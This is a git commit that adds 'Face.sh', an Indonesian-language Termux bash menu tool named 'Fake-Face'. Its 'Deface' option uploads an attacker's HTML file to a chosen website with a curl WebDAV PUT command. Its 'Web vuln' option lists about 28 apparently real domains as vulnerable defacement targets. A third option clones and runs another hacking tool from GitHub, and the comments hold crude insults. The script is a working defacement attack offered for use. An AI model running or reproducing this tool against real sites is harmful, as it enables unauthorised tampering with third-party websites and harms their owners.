d091ada1c3cffce7c7798fa04da73d1cd8184fe5
Labib/InYourMine7 <46355160+MyLovee@users.noreply.github.com>
2019-01-05 02:23:46 +0700

    Create Face.sh

---
+++ Face.sh
@@ -0,0 +1,159 @@
+clear
+clear
+#!/system/xbin/bash
+#ngapain lu bangsat
+#mau record?
+#apa faedah nya? biar di bilang mastah?
+#kok gua ngukuk ya
+#lu ngerecord gak bakal ngubah lu jadi mastah goblok
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#colors
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+indigo="\033[34;1m"
+clear
+echo "Asslamualaikum Wr Wb"
+sleep 1
+echo "Selamat Datang di Tolls Fake-Face"
+sleep 2
+clear
+toilet -f future -F gay F a k e - F a c e
+echo $yellow "_______________________________________"
+echo $cyan "Author : InYourMine7"
+echo $purple "Team : 2Easy4Hack Team"
+echo $green "contact : 0895378276565"
+echo $yellow "——————————————————————————————————————"
+echo ""
+echo $white "1.Deface"
+echo $cyan "2.Web vuln"
+echo $green "3.Install Tolls Fake-Lovee"
+echo $yellow "99.Info Tolls"
+echo $white "0.Keluar/Exit"
+echo ""
+echo $white"╭─root@InYourMine7~# "
+read -p "╰─$" kampang
+
+if [ $kampang = "0" ] || [ $kampang = "00" ]
+then
+echo $cyan
+clear
+figlet "keluar"
+echo $white "Terimakasi telah menggunakan tols kami semoga berfaedah :)"
+fi
+
+if [ $kampang = "01" ] || [ $kampang = "1" ]
+then
+clear
+echo $yellow"Masukan Web Target kalo blm punya pilih no 2 "
+echo " " $cyan
+read -p "Masukan Web Target : " target;
+echo " "
+sleep 1
+echo $cyan"Masukin Sc depes kalian kalo mau tebas index namain sc nya Index.html"
+echo $yellow"Simpan SC Di Memory Internal Di Luar Folder "
+echo " "$cyan
+read -p "Masukan Nama Script : " sc;
+sleep 2
+curl -T /sdcard/$sc $target
+clear
+sleep 1
+figlet "Done"
+echo $yellow"udah kehek silah kan salin dan liat di google" $white": " $target/$sc
+echo $cyan
+echo "╭─[B]:Back [E]:Exit "
+echo "|"$yellow
+read -p "╰─[B]/[E] :" kontol
+fi
+
+if [ $kampang = "02" ] || [ $kampang = "2" ]
+then
+clear
+toilet -f future -F gay Web Vuln Webdav
+echo "http://contsol.co.za"
+echo "http://colourfactory.co.za"
+echo "http://centraltech.co.za"
+echo "http://chasingfantasia.com"
+echo "http://centraltech.co.za"
+echo "http://cblandscapes.co.za"
+echo "http://bee-it.co.za"
+echo "http://butterflowers.co.za"
+echo "http://bananabox.co.za"
+echo "http://ayk.co.za"
+echo "http://ads247.co.za"
+echo "http://allpaint.co.za"
+echo "http://atlanticphysio.co.za"
+echo "http://valdicare.co.za"
+echo "http://vmicl.co.za"
+echo "http://troon.co.za"
+echo "http://nyarhi.co.za"
+echo "http://nitrobikes.co.za"
+echo "http://nhisa.co.za"
+echo "http://netcallcollect.co.za"
+echo "http://naturaleyeimages.com"
+echo "http://mpark.co.za"
+echo "http://moneyin1week.co.za"
+echo "http://mix007.co.za" 
+echo "http://mediacube.co.za"
+echo "http://megro.co.za"
+echo "http://menogold.co.za"
+echo "http://mestern.co.za"
+echo $cyan
+echo "╭─[B]:Back [E]:Exit "
+echo "|"$yellow
+read -p "╰─[B]/[E] :" kontol
+fi
+
+if [ $kampang = "03" ] || [ $kampang = "3" ]
+then
+clear
+toilet -f future -F gay Menginstall
+pkg update & pkg upgrade
+pkg install figlet
+pkg install git
+git clone https://github.com/MyLovee/Fake-Lovee
+cd Fake-Lovee
+sh Lovee.sh
+fi
+
+if [ $kampang = "99" ] || [ $kampang = "99" ]
+then
+clear
+toilet -f future -F gay Info Tolls
+echo""
+echo $yellow "Author : InYourMine7                 "
+echo $cyan   "Github : https://github.com/MyLovee "
+echo $yellow "Name Tolls : Fake-Face"
+echo $cyan   "–=My Friends=–"
+echo $yellow "InYourHeart"
+echo $cyan   "InYourNick"
+echo $yellow "InYourZamaludin404"
+echo $cyan   "IY×KID"
+echo $yellow "Xlon3ly"
+echo $cyan   "IY×Labil"
+echo $yellow "Wahyu Dhimas/Ogeb"
+echo $cyan   "Tuan Ryu"
+echo $green
+echo "╭─[B]:Back [E]:Exit "
+echo "|"$yellow
+read -p "╰─[B]/[E] :" kontol
+fi
+
+if [ $kontol = "B" ] || [ $kontol = "b" ]
+then
+clear
+sh Fake-Face.sh
+fi
+
+if [ $kontol = "E" ] || [ $Kontol = "e" ]
+then
+clear
+echo $cyan
+clear
+figlet "keluar"
+echo $white "Terimakasi telah menggunakan tols kami semoga berfaedah :)"
+fi
